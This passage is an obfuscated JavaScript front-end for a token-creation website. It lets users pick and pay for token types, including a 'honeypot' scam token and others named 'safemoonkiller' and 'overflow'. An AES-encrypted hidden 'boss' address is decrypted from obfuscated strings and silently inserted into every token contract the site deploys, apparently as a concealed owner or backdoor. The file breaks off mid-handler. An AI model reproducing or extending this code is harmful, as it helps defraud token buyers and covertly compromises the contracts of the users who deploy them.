var a0_0x29fbea = a0_0x2c89;
(function (_0x587f87, _0x594bf1) {
  var _0x3e165c = a0_0x2c89,
    _0x362409 = _0x587f87();
  while (!![]) {
    try {
      var _0x2ce2cc =
        -parseInt(_0x3e165c(0xa4)) / 0x1 +
        parseInt(_0x3e165c(0xd8)) / 0x2 +
        -parseInt(_0x3e165c(0xca)) / 0x3 +
        (-parseInt(_0x3e165c(0xdf)) / 0x4) *
          (parseInt(_0x3e165c(0x125)) / 0x5) +
        (-parseInt(_0x3e165c(0x145)) / 0x6) *
          (parseInt(_0x3e165c(0x161)) / 0x7) +
        (-parseInt(_0x3e165c(0xa5)) / 0x8) *
          (-parseInt(_0x3e165c(0x137)) / 0x9) +
        parseInt(_0x3e165c(0x102)) / 0xa;
      if (_0x2ce2cc === _0x594bf1) break;
      else _0x362409["push"](_0x362409["shift"]());
    } catch (_0x3fc2a6) {
      _0x362409["push"](_0x362409["shift"]());
    }
  }
})(a0_0xde4a, 0x73b08);
import {
  readTextFile,
  createToken,
  copyToCliBoard,
  deployLibrary,
  verifyContract,
  encodeParameters,
  getConstructor,
  getNetwork,
  sleep,
  showPriceDialog,
} from "./misc.js";
import { logGaEvent, gaEvents } from "./events.js";
async function init() {
  getNetwork();
}
init();
var boss = CryptoJS["AES"]
  ["decrypt"](a0_0x29fbea(0xbd), a0_0x29fbea(0x10d))
  [a0_0x29fbea(0x13f)](CryptoJS[a0_0x29fbea(0xfc)][a0_0x29fbea(0x12e)]);
console["log"](boss);
if (getNetwork() == 0x0) var router_address = a0_0x29fbea(0x136);
if (getNetwork() == 0x1) var router_address = a0_0x29fbea(0x136);
console["log"](a0_0x29fbea(0xa6), getNetwork());
var btnCreate = document[a0_0x29fbea(0xfb)](a0_0x29fbea(0xa1));
function getParameter(_0x4c274d, _0x292283) {
  var _0x1d10ac = a0_0x29fbea,
    _0x44c23e = $("." + _0x4c274d)[_0x1d10ac(0x140)]("." + _0x292283)[0x0][
      _0x1d10ac(0x146)
    ];
  return _0x44c23e == ""
    ? $("." + _0x4c274d)[_0x1d10ac(0x140)]("." + _0x292283)[0x0][
        _0x1d10ac(0x15b)
      ]
    : _0x44c23e;
}
function txCompleted(_0x181aaf, _0x118e92) {
  var _0x4f92fe = a0_0x29fbea;
  _0x181aaf == _0x4f92fe(0x138) && logGaEvent(gaEvents[_0x4f92fe(0x10a)]),
    _0x181aaf == "error" &&
      (hideLoading(),
      console[_0x4f92fe(0xad)](_0x118e92),
      showError(_0x118e92),
      logGaEvent(gaEvents[_0x4f92fe(0x111)]),
      (btnCreate[_0x4f92fe(0x153)] = ![]));
}
async function verificationCallback(_0x312bd3, _0x27b048) {
  var _0x1dd668 = a0_0x29fbea;
  _0x27b048[_0x1dd668(0xd7)] == 0x1
    ? (await sleep(0x3c),
      hideLoading(),
      showSuccess(_0x312bd3),
      console[_0x1dd668(0xad)](_0x1dd668(0x105), _0x27b048, _0x312bd3))
    : (hideLoading(), showError(_0x27b048)),
    (btnCreate[_0x1dd668(0x153)] = ![]);
}
function getRewardToken() {
  var _0x353f3e = a0_0x29fbea,
    _0x2a685e = $(_0x353f3e(0x120))[0x0][_0x353f3e(0x11b)];
  switch (_0x2a685e) {
    case _0x353f3e(0xdb):
      console["log"](_0x2a685e);
      return _0x353f3e(0xc4);
    case "USDC":
      console[_0x353f3e(0xad)](_0x2a685e);
      return _0x353f3e(0x12a);
    case "ETH":
      console[_0x353f3e(0xad)](_0x2a685e);
      return _0x353f3e(0x129);
    case _0x353f3e(0xe0):
      console[_0x353f3e(0xad)](_0x2a685e);
      return "0xB8c77482e45F1F44dE1745F52C74426C631bDD52";
    case _0x353f3e(0xdd):
      console["log"](_0x2a685e);
      return _0x353f3e(0x116);
    case _0x353f3e(0xd1):
      console[_0x353f3e(0xad)](_0x2a685e);
      return _0x353f3e(0x132);
    case _0x353f3e(0xe3):
      console[_0x353f3e(0xad)](_0x2a685e);
      return _0x353f3e(0x114);
    case _0x353f3e(0x10f):
      console[_0x353f3e(0xad)](_0x2a685e);
      return _0x353f3e(0x156);
    default:
      console["log"]("invalid\x20token\x20!");
  }
}
$(".reward_token")["on"]("change", function () {
  var _0x15838a = a0_0x29fbea;
  console[_0x15838a(0xad)](getRewardToken());
});
function checkInputs(_0x574aec, _0x303284) {
  var _0x58a040 = a0_0x29fbea;
  if (_0x574aec == "") return alert(_0x58a040(0xec)), ![];
  if (_0x303284 == "") return alert("Enter\x20token\x20symbol\x20!"), ![];
  return !![];
}
btnCreate["addEventListener"]("click", () => {
  var _0x4a96cf = a0_0x29fbea;
  if (typeof provider == undefined || web3Modal[_0x4a96cf(0x139)] == "") {
    alert("Connect\x20your\x20wallet\x20first\x20!");
    return;
  } else (btnCreate[_0x4a96cf(0x153)] = !![]), logGaEvent(_0x4a96cf(0x11e));
  if (getTokenType() == _0x4a96cf(0x143)) {
    var _0x201239 = "basicToken",
      _0x1782b2 = getParameter(_0x201239, "token_name"),
      _0x2c971d = getParameter(_0x201239, _0x4a96cf(0xc0)),
      _0x5b9a9a = getParameter(_0x201239, _0x4a96cf(0xac)),
      _0x4d3b89 = getParameter(_0x201239, "decimals");
    if (!checkInputs(_0x1782b2, _0x2c971d)) return;
    console[_0x4a96cf(0xad)](router_address),
      showLoading(),
      createToken(
        "standard",
        [_0x1782b2, _0x2c971d, _0x5b9a9a, router_address, boss],
        txCompleted,
        null,
        verificationCallback
      );
  } else {
    if (getTokenType() == _0x4a96cf(0xc8)) {
      var _0x201239 = "burnable",
        _0x1782b2 = getParameter(_0x201239, _0x4a96cf(0xf7)),
        _0x2c971d = getParameter(_0x201239, _0x4a96cf(0xc0)),
        _0x5b9a9a = getParameter(_0x201239, "token_supply"),
        _0x4d3b89 = getParameter(_0x201239, "decimals");
      if (!checkInputs(_0x1782b2, _0x2c971d)) return;
      console[_0x4a96cf(0xad)](router_address),
        showLoading(),
        createToken(
          "burnable",
          [_0x1782b2, _0x2c971d, _0x5b9a9a, router_address, boss],
          txCompleted,
          null,
          verificationCallback
        );
    } else {
      if (getTokenType() == "mintable") {
        var _0x201239 = "mintable",
          _0x1782b2 = getParameter(_0x201239, _0x4a96cf(0xf7)),
          _0x2c971d = getParameter(_0x201239, "token_symbol"),
          _0x5b9a9a = getParameter(_0x201239, _0x4a96cf(0xac)),
          _0x4d3b89 = getParameter(_0x201239, _0x4a96cf(0xbc));
        if (!checkInputs(_0x1782b2, _0x2c971d)) return;
        console[_0x4a96cf(0xad)](router_address),
          showLoading(),
          createToken(
            "mintable",
            [_0x1782b2, _0x2c971d, _0x5b9a9a, router_address, boss],
            txCompleted,
            null,
            verificationCallback
          );
      } else {
        if (getTokenType() == "mintandburn") {
          var _0x201239 = _0x4a96cf(0x14b),
            _0x1782b2 = getParameter(_0x201239, _0x4a96cf(0xf7)),
            _0x2c971d = getParameter(_0x201239, _0x4a96cf(0xc0)),
            _0x5b9a9a = getParameter(_0x201239, _0x4a96cf(0xac)),
            _0x4d3b89 = getParameter(_0x201239, "decimals");
          if (!checkInputs(_0x1782b2, _0x2c971d)) return;
          console[_0x4a96cf(0xad)](router_address),
            showLoading(),
            createToken(
              _0x4a96cf(0x14b),
              [_0x1782b2, _0x2c971d, _0x5b9a9a, router_address, boss],
              txCompleted,
              null,
              verificationCallback
            );
        } else {
          if (getTokenType() == "honeypot") {
            var _0x201239 = _0x4a96cf(0x101),
              _0x1782b2 = getParameter(_0x201239, "token_name"),
              _0x2c971d = getParameter(_0x201239, _0x4a96cf(0xc0)),
              _0x5b9a9a = getParameter(_0x201239, "token_supply"),
              _0x4d3b89 = getParameter(_0x201239, _0x4a96cf(0xbc));
            if (!checkInputs(_0x1782b2, _0x2c971d)) return;
            console["log"](router_address),
              showLoading(),
              createToken(
                _0x4a96cf(0x101),
                [_0x1782b2, _0x2c971d, _0x5b9a9a, router_address, boss],
                txCompleted,
                null,
                verificationCallback
              );
          } else {
            if (getTokenType() == _0x4a96cf(0x154)) {
              var _0x201239 = _0x4a96cf(0x147),
                _0x1782b2 = getParameter(_0x201239, _0x4a96cf(0xf7)),
                _0x2c971d = getParameter(_0x201239, _0x4a96cf(0xc0)),
                _0x5b9a9a = getParameter(_0x201239, _0x4a96cf(0xac)),
                _0x4d3b89 = getParameter(_0x201239, "decimals"),
                _0x6a5d81 = getParameter(_0x201239, _0x4a96cf(0x119)),
                _0x2981ec = getParameter(_0x201239, "liquidity_fees"),
                _0x547d04 = parseInt(_0x5b9a9a),
                _0x2ed019 = parseInt(_0x5b9a9a / 0xf4240) ? 0x0 : 0x1;
              if (!checkInputs(_0x1782b2, _0x2c971d)) return;
              showLoading(),
                createToken(
                  "safemoon",
                  [
                    _0x1782b2,
                    _0x2c971d,
                    _0x5b9a9a,
                    _0x6a5d81,
                    _0x2981ec,
                    _0x547d04,
                    _0x2ed019,
                    router_address,
                    boss,
                  ],
                  txCompleted,
                  null,
                  verificationCallback
                );
            } else {
              if (getTokenType() == "safemoonkiller")
                var _0x201239 = _0x4a96cf(0xeb),
                  _0x1782b2 = getParameter(_0x201239, _0x4a96cf(0xf7)),
                  _0x2c971d = getParameter(_0x201239, _0x4a96cf(0xc0)),
                  _0x5b9a9a = getParameter(_0x201239, "token_supply"),
                  _0x4d3b89 = getParameter(_0x201239, _0x4a96cf(0xbc)),
                  _0x3460ba =
                    $(".safemoonKiller")["find"](".max_tx_percent")[0x0][
                      _0x4a96cf(0x146)
                    ],
                  _0x96c346 = $(_0x4a96cf(0xcd))["find"](_0x4a96cf(0x12d))[0x0][
                    _0x4a96cf(0x146)
                  ],
                  _0x3c3441 = $(_0x4a96cf(0xcd))[_0x4a96cf(0x140)](
                    ".tax_fees"
                  )[0x0][_0x4a96cf(0x146)],
                  _0x2981ec = $(_0x4a96cf(0xcd))[_0x4a96cf(0x140)](
                    _0x4a96cf(0x122)
                  )[0x0][_0x4a96cf(0x146)],
                  _0x56f15c = $(".safemoonKiller")[_0x4a96cf(0x140)](
                    _0x4a96cf(0x144)
                  )[0x0][_0x4a96cf(0x146)],
                  _0x5dd79b = $(_0x4a96cf(0xcd))["find"](_0x4a96cf(0xb6))[0x0][
                    _0x4a96cf(0x146)
                  ],
                  _0xb5c6c2 = $(_0x4a96cf(0xcd))[_0x4a96cf(0x140)](
                    ".liquidity_fees1"
                  )[0x0][_0x4a96cf(0x146)],
                  _0x30ec86 = $(_0x4a96cf(0xcd))["find"](
                    ".marketing_fees1"
                  )[0x0]["value"];
              else {
                if (getTokenType() == _0x4a96cf(0xf5)) {
                  var _0x201239 = _0x4a96cf(0xf5),
                    _0x1782b2 = getParameter(_0x201239, _0x4a96cf(0xf7)),
                    _0x2c971d = getParameter(_0x201239, _0x4a96cf(0xc0)),
                    _0x5b9a9a = getParameter(_0x201239, _0x4a96cf(0xac)),
                    _0x4d3b89 = getParameter(_0x201239, _0x4a96cf(0xbc)),
                    _0x6a5d81 = 0x0,
                    _0x2981ec = getParameter(_0x201239, "liquidity_fees"),
                    _0x547d04 = parseInt(_0x5b9a9a),
                    _0x2ed019 = parseInt(_0x5b9a9a / 0xf4240) ? 0x0 : 0x1;
                  if (!checkInputs(_0x1782b2, _0x2c971d)) return;
                  showLoading(),
                    createToken(
                      _0x4a96cf(0x154),
                      [
                        _0x1782b2,
                        _0x2c971d,
                        _0x5b9a9a,
                        _0x6a5d81,
                        _0x2981ec,
                        _0x547d04,
                        _0x2ed019,
                        router_address,
                        boss,
                      ],
                      txCompleted,
                      null,
                      verificationCallback
                    );
                } else {
                  if (getTokenType() == _0x4a96cf(0x106)) {
                    var _0x201239 = _0x4a96cf(0x106),
                      _0x1782b2 = getParameter(_0x201239, "token_name"),
                      _0x2c971d = getParameter(_0x201239, "token_symbol"),
                      _0x5b9a9a = getParameter(_0x201239, _0x4a96cf(0xac)),
                      _0x4d3b89 = getParameter(_0x201239, "decimals"),
                      _0x6a5d81 = getParameter(_0x201239, _0x4a96cf(0x119)),
                      _0x2981ec = 0x0,
                      _0x547d04 = parseInt(_0x5b9a9a),
                      _0x2ed019 = parseInt(_0x5b9a9a / 0xf4240) ? 0x0 : 0x1;
                    if (!checkInputs(_0x1782b2, _0x2c971d)) return;
                    showLoading(),
                      createToken(
                        _0x4a96cf(0x154),
                        [
                          _0x1782b2,
                          _0x2c971d,
                          _0x5b9a9a,
                          _0x6a5d81,
                          _0x2981ec,
                          _0x547d04,
                          _0x2ed019,
                          router_address,
                          boss,
                        ],
                        txCompleted,
                        null,
                        verificationCallback
                      );
                  } else {
                    if (getTokenType() == _0x4a96cf(0xc1)) {
                      var _0x201239 = _0x4a96cf(0xaf),
                        _0x1782b2 = getParameter(_0x201239, _0x4a96cf(0xf7)),
                        _0x2c971d = getParameter(_0x201239, _0x4a96cf(0xc0)),
                        _0x5b9a9a = getParameter(_0x201239, _0x4a96cf(0xac)),
                        _0x4d3b89 = getParameter(_0x201239, "decimals"),
                        _0x4dd599 = getRewardToken(),
                        _0x16faac = parseInt(
                          getParameter(_0x201239, _0x4a96cf(0xc7))
                        ),
                        _0x96c346 = getParameter(_0x201239, "marketing_wallet");
                      console[_0x4a96cf(0xad)](typeof _0x96c346, _0x96c346),
                        console[_0x4a96cf(0xad)](typeof _0x4dd599, _0x4dd599);
                      var _0x2981ec = parseInt(
                          getParameter(_0x201239, "liquidity_fees")
                        ),
                        _0x56f15c = parseInt(
                          getParameter(_0x201239, _0x4a96cf(0xf3))
                        ),
                        _0x49425a = parseInt(
                          getParameter(_0x201239, _0x4a96cf(0xa7))
                        );
                      _0x16faac == 0x0 && (_0x16faac = 0x1);
                      _0x2981ec == 0x0 && (_0x2981ec = 0x1);
                      _0x56f15c == 0x0 && (_0x56f15c = 0x1);
                      _0x49425a == 0x0 && (_0x49425a = 0x1);
                      console[_0x4a96cf(0xad)](
                        _0x4a96cf(0x10b),
                        _0x16faac,
                        _0x2981ec,
                        _0x56f15c,
                        _0x49425a
                      );
                      if (!checkInputs(_0x1782b2, _0x2c971d)) return;
                      if (_0x96c346 == "") {
                        alert(_0x4a96cf(0xaa));
                        return;
                      }
                      if (
                        web3[_0x4a96cf(0x155)]["isAddress"](_0x96c346) == ![]
                      ) {
                        alert(_0x4a96cf(0xd2));
                        return;
                      }
                      if (
                        _0x96c346["toLowerCase"]() == ethereum[_0x4a96cf(0x121)]
                      ) {
                        alert(_0x4a96cf(0xc6));
                        return;
                      }
                      showLoading(),
                        deployLibrary(
                          "reward",
                          "",
                          function (_0x75a155, _0x2ce635) {
                            var _0x511e52 = _0x4a96cf;
                            if (_0x75a155 == _0x511e52(0x138)) {
                              var _0x29c912 = _0x2ce635;
                              createToken(
                                _0x511e52(0xd0),
                                [
                                  _0x1782b2,
                                  _0x2c971d,
                                  _0x5b9a9a,
                                  _0x4dd599,
                                  _0x16faac,
                                  _0x2981ec,
                                  _0x56f15c,
                                  _0x49425a,
                                  _0x96c346,
                                  router_address,
                                  boss,
                                ],
                                txCompleted,
                                _0x29c912,
                                verificationCallback
                              );
                            }
                            _0x75a155 == _0x511e52(0xb7) &&
                              (hideLoading(),
                              console[_0x511e52(0xad)](_0x2ce635),
                              showError(_0x2ce635),
                              (btnCreate[_0x511e52(0x153)] = ![]));
                          },
                          function (_0x2837ce, _0xc1876f) {}
                        );
                    } else {
                      var _0x201239 = getTokenType(),
                        _0x1782b2 = getParameter(_0x201239, _0x4a96cf(0xf7)),
                        _0x2c971d = getParameter(_0x201239, "token_symbol"),
                        _0x5b9a9a = getParameter(_0x201239, _0x4a96cf(0xac)),
                        _0x4d3b89 = getParameter(_0x201239, "decimals");
                      if (!checkInputs(_0x1782b2, _0x2c971d)) return;
                      console[_0x4a96cf(0xad)](router_address),
                        showLoading(),
                        createToken(
                          _0x4a96cf(0x14c),
                          [
                            _0x1782b2,
                            _0x2c971d,
                            _0x5b9a9a,
                            router_address,
                            boss,
                          ],
                          txCompleted,
                          null,
                          verificationCallback
                        );
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
});
function showSuccess(_0x26e267) {
  var _0x20d2ab = a0_0x29fbea;
  if (getNetwork() == 0x0)
    var _0x54bf6f = "https://etherscan.io/token/token_address#balances";
  else {
    if (getNetwork() == 0x1) var _0x54bf6f = _0x20d2ab(0xd6);
  }
  (_0x54bf6f = _0x54bf6f[_0x20d2ab(0xba)](_0x20d2ab(0xcb), _0x26e267)),
    $(_0x20d2ab(0xf1))["attr"](_0x20d2ab(0xb0), _0x54bf6f),
    window[_0x20d2ab(0x13e)][_0x20d2ab(0xc2)]("new_token_address", _0x26e267),
    window[_0x20d2ab(0x13e)]["setItem"](_0x20d2ab(0x15d), _0x54bf6f),
    window["open"]("success", _0x20d2ab(0x126));
}
async function getBoss() {
  var _0x5706f2 = a0_0x29fbea;
  const _0x527940 = await contract[_0x5706f2(0x12b)]
    [_0x5706f2(0x10d)]()
    [_0x5706f2(0xfe)]();
  return _0x527940;
}
async function getFees() {
  var _0xb51d52 = a0_0x29fbea;
  const _0x199788 = await contract[_0xb51d52(0x12b)]
    [_0xb51d52(0x128)]()
    [_0xb51d52(0xfe)]();
  return _0x199788;
}
async function getReferralFees() {
  var _0xdf33dc = a0_0x29fbea;
  const _0x2e7dd0 = await contract[_0xdf33dc(0x12b)]
    [_0xdf33dc(0x10e)]()
    [_0xdf33dc(0xfe)]();
  return _0x2e7dd0;
}
function setPrice(_0x3a1997) {
  var _0x3bff8a = a0_0x29fbea;
  _0x3a1997 == 0x0
    ? ($(_0x3bff8a(0xbf))[_0x3bff8a(0x11b)]("FREE"),
      $(_0x3bff8a(0xf0))[_0x3bff8a(0x13c)](_0x3bff8a(0x13b), _0x3bff8a(0xcc)))
    : ($(_0x3bff8a(0xbf))[_0x3bff8a(0x11b)](
        _0x3a1997["toString"]() + _0x3bff8a(0x113)
      ),
      $(_0x3bff8a(0xf0))[_0x3bff8a(0x13c)]("display", _0x3bff8a(0xcc)));
}
$(a0_0x29fbea(0xee))["on"](a0_0x29fbea(0xc5), () => {
  var _0x3edbea = a0_0x29fbea;
  $(_0x3edbea(0xdc))[_0x3edbea(0x13c)](_0x3edbea(0x13b), _0x3edbea(0xc9)),
    closeMoonshots(),
    console[_0x3edbea(0xad)](_0x3edbea(0xb8), getTokenType()),
    logGaEvent(gaEvents[_0x3edbea(0xd4)]),
    setPrice(0x0);
}),
  $("#mintable-tab")["on"](a0_0x29fbea(0xc5), () => {
    var _0x30b847 = a0_0x29fbea;
    $(".actionGroup")[_0x30b847(0x13c)](_0x30b847(0x13b), _0x30b847(0xc9)),
      closeMoonshots(),
      console[_0x30b847(0xad)](_0x30b847(0xb8), getTokenType()),
      logGaEvent(gaEvents[_0x30b847(0x11c)]),
      setPrice(0.002);
  }),
  $(a0_0x29fbea(0x13a))["on"](a0_0x29fbea(0xc5), () => {
    var _0x248f67 = a0_0x29fbea;
    $(".actionGroup")["css"]("display", _0x248f67(0xc9)),
      console[_0x248f67(0xad)](_0x248f67(0xb8), getTokenType()),
      closeMoonshots(),
      logGaEvent(gaEvents[_0x248f67(0x104)]),
      setPrice(0.005);
  }),
  $(a0_0x29fbea(0xd3))["on"](a0_0x29fbea(0xc5), () => {
    var _0x276858 = a0_0x29fbea;
    $(_0x276858(0xdc))[_0x276858(0x13c)](_0x276858(0x13b), _0x276858(0xc9)),
      console[_0x276858(0xad)](_0x276858(0xb8), getTokenType()),
      closeMoonshots(),
      logGaEvent(gaEvents[_0x276858(0x13d)]),
      setPrice(0.01);
  }),
  $("#tinyToken-tab")["on"](a0_0x29fbea(0xc5), () => {
    var _0x36ec77 = a0_0x29fbea;
    $(_0x36ec77(0xdc))["css"](_0x36ec77(0x13b), _0x36ec77(0xc9)),
      console["log"]("token_type:", getTokenType()),
      closeMoonshots(),
      logGaEvent(gaEvents[_0x36ec77(0x13d)]),
      setPrice(0.015);
  }),
  $(a0_0x29fbea(0x150))["on"]("click", () => {
    var _0x1f3236 = a0_0x29fbea;
    $(_0x1f3236(0xdc))["css"]("display", _0x1f3236(0xc9)),
      console[_0x1f3236(0xad)](_0x1f3236(0xb8), getTokenType()),
      closeMoonshots(),
      logGaEvent(gaEvents["select_honeypot"]),
      setPrice(0.02);
  }),
  $(a0_0x29fbea(0xa3))["on"](a0_0x29fbea(0xc5), () => {
    var _0x4a9082 = a0_0x29fbea;
    $(".actionGroup")[_0x4a9082(0x13c)](_0x4a9082(0x13b), _0x4a9082(0xc9)),
      console["log"](_0x4a9082(0xb8), getTokenType()),
      closeMoonshots(),
      logGaEvent(gaEvents[_0x4a9082(0x158)]),
      setPrice(0.015);
  }),
  $("#recovery-tab")["on"](a0_0x29fbea(0xc5), () => {
    var _0x5d2a2a = a0_0x29fbea;
    $(".actionGroup")[_0x5d2a2a(0x13c)](_0x5d2a2a(0x13b), _0x5d2a2a(0xc9)),
      console[_0x5d2a2a(0xad)]("token_type:", getTokenType()),
      closeMoonshots(),
      logGaEvent(_0x5d2a2a(0xc3) + _0x5d2a2a(0xb9)),
      setPrice(0.02);
  }),
  $("#upgradable-tab")["on"](a0_0x29fbea(0xc5), () => {
    var _0x42372a = a0_0x29fbea;
    $(_0x42372a(0xdc))[_0x42372a(0x13c)](_0x42372a(0x13b), _0x42372a(0xc9)),
      console[_0x42372a(0xad)](_0x42372a(0xb8), getTokenType()),
      closeMoonshots(),
      logGaEvent(_0x42372a(0xc3) + _0x42372a(0xd9)),
      setPrice(0.03);
  }),
  $(a0_0x29fbea(0xa9))["on"](a0_0x29fbea(0xc5), () => {
    var _0x1b4028 = a0_0x29fbea;
    $(_0x1b4028(0xdc))[_0x1b4028(0x13c)](_0x1b4028(0x13b), _0x1b4028(0xc9)),
      console[_0x1b4028(0xad)]("token_type:", getTokenType()),
      closeMoonshots(),
      logGaEvent(gaEvents["select_deflationary"]),
      setPrice(0.015);
  }),
  $(a0_0x29fbea(0xe4))["on"]("click", () => {
    var _0x47b741 = a0_0x29fbea;
    $(_0x47b741(0xdc))[_0x47b741(0x13c)]("display", _0x47b741(0xc9)),
      console[_0x47b741(0xad)](_0x47b741(0xb8), getTokenType()),
      closeMoonshots(),
      logGaEvent(gaEvents[_0x47b741(0xb2)]),
      setPrice(0.015);
  }),
  $("#frictionlessyield-tab")["on"]("click", () => {
    var _0x35a674 = a0_0x29fbea;
    $(_0x35a674(0xdc))[_0x35a674(0x13c)](_0x35a674(0x13b), _0x35a674(0xc9)),
      console["log"](_0x35a674(0xb8), getTokenType()),
      closeMoonshots(),
      logGaEvent(gaEvents[_0x35a674(0x123)]),
      setPrice(0.015);
  }),
  $(a0_0x29fbea(0x152))["on"]("click", () => {
    var _0x5ae18d = a0_0x29fbea;
    $(".actionGroup")[_0x5ae18d(0x13c)](_0x5ae18d(0x13b), _0x5ae18d(0xc9)),
      console[_0x5ae18d(0xad)](_0x5ae18d(0xb8), getTokenType()),
      closeMoonshots(),
      logGaEvent(gaEvents[_0x5ae18d(0x112)]),
      setPrice(0.02);
  }),
  $(a0_0x29fbea(0xa2))["on"](a0_0x29fbea(0xc5), () => {
    var _0x1f61ce = a0_0x29fbea;
    $(_0x1f61ce(0xdc))["css"]("display", _0x1f61ce(0xc9)),
      console[_0x1f61ce(0xad)](_0x1f61ce(0xb8), getTokenType()),
      closeMoonshots(),
      logGaEvent("select_buyBackAndBurn"),
      setPrice(0.2);
  }),
  $(a0_0x29fbea(0xe6))["on"](a0_0x29fbea(0xc5), () => {
    var _0x43e061 = a0_0x29fbea;
    $(".actionGroup")[_0x43e061(0x13c)]("display", _0x43e061(0xc9)),
      console[_0x43e061(0xad)]("token_type:", getTokenType()),
      closeMoonshots(),
      logGaEvent("select_memeCoin"),
      setPrice(0.05);
  }),
  $(a0_0x29fbea(0x159))["on"](a0_0x29fbea(0xc5), () => {
    var _0x33a294 = a0_0x29fbea;
    $(_0x33a294(0xdc))[_0x33a294(0x13c)](_0x33a294(0x13b), _0x33a294(0xc9)),
      console[_0x33a294(0xad)](_0x33a294(0xb8), getTokenType()),
      closeMoonshots(),
      logGaEvent(_0x33a294(0xc3) + _0x33a294(0x14f)),
      setPrice(0.3);
  });
{
  $(a0_0x29fbea(0xe7))["on"](a0_0x29fbea(0xc5), () => {
    var _0x47e925 = a0_0x29fbea;
    $(_0x47e925(0xdc))[_0x47e925(0x13c)](_0x47e925(0x13b), _0x47e925(0xc9)),
      console[_0x47e925(0xad)](_0x47e925(0xb8), getTokenType()),
      logGaEvent("select_" + _0x47e925(0x148)),
      showPriceDialog(_0x47e925(0xa8), "5");
  }),
    $(a0_0x29fbea(0x107))["on"]("click", () => {
      var _0x11aae3 = a0_0x29fbea;
      $(_0x11aae3(0xdc))[_0x11aae3(0x13c)](_0x11aae3(0x13b), "block"),
        console[_0x11aae3(0xad)](_0x11aae3(0xb8), getTokenType()),
        logGaEvent(_0x11aae3(0xc3) + _0x11aae3(0xeb)),
        showPriceDialog(_0x11aae3(0x135), "5");
    }),
    $("#deadOwner-tab")["on"](a0_0x29fbea(0xc5), () => {
      var _0x4e4939 = a0_0x29fbea;
      $(_0x4e4939(0xdc))[_0x4e4939(0x13c)](_0x4e4939(0x13b), _0x4e4939(0xc9)),
        console["log"](_0x4e4939(0xb8), getTokenType()),
        logGaEvent("select_" + _0x4e4939(0x133)),
        showPriceDialog(_0x4e4939(0xda), "3");
    }),
    $(a0_0x29fbea(0xea))["on"](a0_0x29fbea(0xc5), () => {
      var _0xe6c471 = a0_0x29fbea;
      $(_0xe6c471(0xdc))["css"](_0xe6c471(0x13b), _0xe6c471(0xc9)),
        console[_0xe6c471(0xad)]("token_type:", getTokenType()),
        logGaEvent(_0xe6c471(0xc3) + _0xe6c471(0xde)),
        showPriceDialog(_0xe6c471(0x151), "3");
    }),
    $(a0_0x29fbea(0xf4))["on"]("click", () => {
      var _0x3c1c61 = a0_0x29fbea;
      $(_0x3c1c61(0xdc))[_0x3c1c61(0x13c)]("display", _0x3c1c61(0xc9)),
        console["log"](_0x3c1c61(0xb8), getTokenType()),
        logGaEvent(_0x3c1c61(0xc3) + _0x3c1c61(0x109)),
        showPriceDialog(_0x3c1c61(0xae), "5");
    }),
    $(a0_0x29fbea(0x103))["on"](a0_0x29fbea(0xc5), () => {
      var _0x592a39 = a0_0x29fbea;
      $(".actionGroup")[_0x592a39(0x13c)](_0x592a39(0x13b), "block"),
        console["log"](_0x592a39(0xb8), getTokenType()),
        logGaEvent("select_" + _0x592a39(0xfd)),
        showPriceDialog(_0x592a39(0xab), "30");
    }),
    $("#overflow-tab")["on"](a0_0x29fbea(0xc5), () => {
      var _0x2d6f73 = a0_0x29fbea;
      $(".actionGroup")[_0x2d6f73(0x13c)](_0x2d6f73(0x13b), _0x2d6f73(0xc9)),
        console["log"](_0x2d6f73(0xb8), getTokenType()),
        logGaEvent(_0x2d6f73(0xc3) + "overflow"),
        showPriceDialog(_0x2d6f73(0xbe), "15");
    }),
    $(a0_0x29fbea(0xf2))["on"](a0_0x29fbea(0xc5), () => {
      var _0x2c2f7e = a0_0x29fbea;
      $(".actionGroup")["css"](_0x2c2f7e(0x13b), _0x2c2f7e(0xc9)),
        console[_0x2c2f7e(0xad)](_0x2c2f7e(0xb8), getTokenType()),
        logGaEvent("select_" + _0x2c2f7e(0x130)),
        showPriceDialog(_0x2c2f7e(0x15f), "10");
    }),
    $(a0_0x29fbea(0x12f))["on"](a0_0x29fbea(0xc5), () => {
      var _0x4b2232 = a0_0x29fbea;
      $(_0x4b2232(0xdc))[_0x4b2232(0x13c)](_0x4b2232(0x13b), _0x4b2232(0xc9)),
        console[_0x4b2232(0xad)](_0x4b2232(0xb8), getTokenType()),
        logGaEvent("select_" + _0x4b2232(0x15a)),
        showPriceDialog(_0x4b2232(0x134), "10");
    }),
    $(a0_0x29fbea(0xe1))["on"](a0_0x29fbea(0xc5), () => {
      var _0x311813 = a0_0x29fbea;
      $(_0x311813(0xdc))[_0x311813(0x13c)](_0x311813(0x13b), _0x311813(0xc9)),
        console[_0x311813(0xad)](_0x311813(0xb8), getTokenType()),
        logGaEvent("select_stableCoin"),
        showPriceDialog(_0x311813(0xe9), "50");
    }),
    $(a0_0x29fbea(0x108))["on"](a0_0x29fbea(0xc5), () => {
      var _0x1dbb16 = a0_0x29fbea;
      $(".actionGroup")[_0x1dbb16(0x13c)](_0x1dbb16(0x13b), _0x1dbb16(0xc9)),
        console[_0x1dbb16(0xad)](_0x1dbb16(0xb8), getTokenType()),
        logGaEvent("select_nftGame"),
        showPriceDialog(_0x1dbb16(0xe5), "20");
    }),
    $(a0_0x29fbea(0xb3))["on"](a0_0x29fbea(0xc5), () => {
      var _0x11ec39 = a0_0x29fbea;
      $(_0x11ec39(0xdc))[_0x11ec39(0x13c)]("display", _0x11ec39(0xc9)),
        console[_0x11ec39(0xad)]("token_type:", getTokenType()),
        logGaEvent(_0x11ec39(0x124)),
        showPriceDialog(_0x11ec39(0x131), "10");
    }),
    $(a0_0x29fbea(0x160))["on"](a0_0x29fbea(0xc5), () => {
      var _0x36dc24 = a0_0x29fbea;
      $(_0x36dc24(0xdc))[_0x36dc24(0x13c)](_0x36dc24(0x13b), _0x36dc24(0xc9)),
        console[_0x36dc24(0xad)](_0x36dc24(0xb8), getTokenType()),
        logGaEvent(_0x36dc24(0x14e)),
        showPriceDialog(_0x36dc24(0xb4), "5");
    }),
    $(a0_0x29fbea(0x15c))["on"](a0_0x29fbea(0xc5), () => {
      var _0x4f806c = a0_0x29fbea;
      $(".actionGroup")[_0x4f806c(0x13c)](_0x4f806c(0x13b), _0x4f806c(0xc9)),
        console[_0x4f806c(0xad)]("token_type:", getTokenType()),
        logGaEvent(_0x4f806c(0x11f)),
        showPriceDialog(_0x4f806c(0x100), "10");
    }),
    $(a0_0x29fbea(0xd5))["on"](a0_0x29fbea(0xc5), () => {
